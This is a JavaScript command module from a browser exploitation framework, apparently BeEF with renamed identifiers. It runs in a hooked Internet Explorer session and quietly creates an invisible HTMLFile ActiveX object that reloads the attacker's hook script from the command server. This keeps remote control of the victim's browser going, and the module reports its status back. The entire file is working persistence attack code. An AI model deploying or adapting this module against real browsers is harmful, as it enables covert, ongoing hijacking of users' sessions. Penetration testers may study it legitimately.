//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  try {
    var hook_url = server.net.httpproto + '://' + server.net.host+ ':' + server.net.port + server.net.hook;

    // create HMTL document
    server.debug("[Invisible HTMLFile ActiveX] Creating HTMLFile ActiveX object");
    doc = new ActiveXObject("HtmlFile");
    doc.open();
    doc.write('<html><body><script src="'+hook_url+'"><\/script></body></html>');
    doc.close();

    // Save a self-reference
    doc.Script.doc = doc;
 
    // Prevent IE from destroying the previous reference
    window.open("","_self");
    server.net.send("<%= @command_url %>", <%= @command_id %>, "success=created HTMLFile ActiveX object", server.are.status_success());
  } catch (e) {
    server.debug("[Invisible HTMLFile ActiveX] could not create HTMLFile ActiveX object: "+e.message)
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not create HTMLFile ActiveX object: " + e.message, server.are.status_error());
  }
});
